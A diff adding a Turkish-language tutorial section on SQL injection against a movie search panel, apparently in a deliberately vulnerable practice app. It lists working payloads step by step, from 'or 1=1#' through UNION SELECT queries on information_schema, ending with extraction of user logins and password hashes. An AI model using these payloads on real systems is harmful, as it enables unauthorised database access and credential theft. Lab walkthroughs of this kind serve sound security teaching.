@@ -278,9 +278,82 @@ gördüğünüz gibi burda şifre yerine ' tek tırnak işareti koydum ve gelen 
 
 ve gördüğünüz gibi sisteme giris yapmayı başardık.
 
+SQL ınjection (POST/search)
+arattığımız filmleri bulan bir panel şimdi bu panelde ' koyarak gelen hata mesajına bakalım.
+
+![photo_6030673690846410859_w](https://user-images.githubusercontent.com/110966683/184357482-c190cc26-4893-4473-b7a5-f13032dcb1f5.jpg)
+
+
+gördüğünüz gibi hata mesajında bir sorun var demekki burda sql kodları deneyebiliriz 
+
+ilk olarak  'or 1=1#   yazıyoruz 
+
+
+![photo_6030673690846410839_w](https://user-images.githubusercontent.com/110966683/184357765-e425b8df-791d-4805-ba29-b93ec4e34981.jpg)
+
+
+gördüğünüz gibi sitedeki tüm filmler çıktı karşımıza 
+
+şimdi union select kullanalım 
+ben öncesinde 
+order by 5#
+order by 8#
+order by 7#
+denedim ve 7 table olduğunu antespit ettim
+şimdi onları görüntüleyelim
+UNION SELECT = her şeyi seç ve  o tabledeki tüm kullanıcıları gösterir
+'or 1=1 union select 1,2,3,4,5,6,7#
+
+
+![photo_6030673690846410840_w](https://user-images.githubusercontent.com/110966683/184357956-c9e561e4-b4b1-4e8e-b61b-b50543d30350.jpg)
+
+
+gördüğünüz gibi tüm filmler çıktı .
+
+
+'and 1=0 union select 1,2,3,4,5,6,7#
+
+şimdi bu komutu çalıştırarak veri isteyebileceğimiz tableleri görelim 
+
+
+![photo_6030673690846410842_w](https://user-images.githubusercontent.com/110966683/184358185-82769306-9d92-4629-9673-c9bfc76b93a8.jpg)
+
+
+2, 3, 4, 5 ten veri isteyebilirmişiz 
+şimdi table isimlerini görelim 
+
+'and 1=0 union select 1,table_name,3,4,5,6,7 from information_schema.tables#
+
+bu komutu yazarak
 
 
 
+
+gördüğünüz gibi bilgiler geldi
+
+şimdide kullanıcının erişimi olan table leri gösterelim
+
+'and 1=0 union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='users' #
+
+
+
+![photo_6030673690846410846_w](https://user-images.githubusercontent.com/110966683/184358556-dd08b1d3-bed2-4caf-bf34-32ddc9127c3b.jpg)
+
+
+gördüğünüz gibi bilgiler geldi
+
+son olarak 
+' and 1=0 union select 1,id,login,4,password,6,7 from users#
+
+bu komutu çalıştıralım ve id login ve password bilgilerini alalım
+
+
+
+![photo_6030673690846410847_w](https://user-images.githubusercontent.com/110966683/184358930-2c9c1488-58d5-4013-adf8-3bdf8f9d5634.jpg)
+
+
+
+gördüğünüz gibi login olan bee ve A.I.M kullanıcıların adı ve şifresi hahsli şekilde  geldi ekrana.
 
 
 
